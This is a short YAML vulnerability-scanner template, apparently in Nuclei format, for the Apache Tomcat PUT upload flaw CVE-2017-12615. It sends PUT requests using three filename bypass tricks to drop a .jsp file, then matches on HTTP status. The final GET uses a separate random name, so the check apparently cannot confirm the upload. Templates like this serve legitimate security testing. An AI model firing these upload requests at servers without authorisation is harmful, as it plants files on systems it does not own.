id: poc-yaml-apache-tomcat-put-rce-cve-2017-12615

info:
  name: poc-yaml-apache-tomcat-put-rce-cve-2017-12615
  author: d4rksec
  severity: medium
  tags: xray-converted,rce,cve-2017-12615

http:
  - raw:
      - |
        PUT /{{rand_base(8)}}.jsp/ HTTP/1.1
        Host: {{Hostname}}

        {{rand_base(8)}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
          - 204
          - 200
  - raw:
      - |
        PUT /{{rand_base(8)}}.jsp%20 HTTP/1.1
        Host: {{Hostname}}

        {{rand_base(8)}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
          - 204
          - 200
  - raw:
      - |
        PUT /{{rand_base(8)}}.jsp::$DATA HTTP/1.1
        Host: {{Hostname}}

        {{rand_base(8)}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
          - 204
          - 200
  - raw:
      - |
        GET /{{rand_base(8)}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200